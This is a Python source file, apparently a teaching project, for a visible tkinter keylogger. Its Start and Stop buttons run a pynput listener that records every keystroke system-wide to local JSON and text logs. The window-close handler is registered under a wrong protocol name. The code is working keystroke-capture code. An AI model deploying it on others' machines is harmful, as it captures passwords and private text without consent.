import tkinter as tk
from pynput import keyboard
import json


key_list = []
x = False
listener = None  


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)


def update_txt_file(key):
    with open('logs.txt', 'a', encoding='utf-8') as key_stroke:
        key_stroke.write(str(key) + '\n')


def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Pressed': str(key)})
    else:
        key_list.append({'Held': str(key)})
    x = True
    update_json_file(key_list)


def on_release(key):
    global x, key_list
    key_list.append({'Released': str(key)})
    if x:
        x = False
    update_json_file(key_list)
    update_txt_file(key)


def start_keylogger():
    global listener
    if listener is None or not listener.running:
        key_list.clear()  
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Status: Keylogger is RUNNING", fg="green")
        print("[+] Keylogger started.")
    else:
        status_label.config(text="Status: Already running", fg="orange")


def stop_keylogger():
    global listener
    if listener and listener.running:
        listener.stop()
        listener = None
        status_label.config(text="Status: Keylogger STOPPED", fg="red")
        print("[+] Keylogger stopped.")
    else:
        status_label.config(text="Status: Not running", fg="red")


root = tk.Tk()
root.title("Keystroke Logger")
root.geometry("400x250")
root.resizable(False, False)


title = tk.Label(root, text="Keylogger Project", font=("Verdana", 12, "bold"))
title.pack(pady=10)


status_label = tk.Label(root, text="Status: Not running", font=("Arial", 10), fg="red")
status_label.pack(pady=5)


button_frame = tk.Frame(root)
button_frame.pack(pady=20)


start_btn = tk.Button(button_frame, text="Start Keylogger", command=start_keylogger, width=20, height=2)
start_btn.grid(row=0, column=0, padx=10)


stop_btn = tk.Button(button_frame, text="Stop Keylogger", command=stop_keylogger, width=20, height=2)
stop_btn.grid(row=0, column=1, padx=10)


info = tk.Label(root, text="Logs saved in: logs.json & logs.txt", font=("Arial", 8), fg="gray")
info.pack(side="bottom", pady=10)


def on_closing():
    if listener and listener.running:
        listener.stop()
    root.destroy()

root.protocol("delete_window", on_closing)


root.mainloop()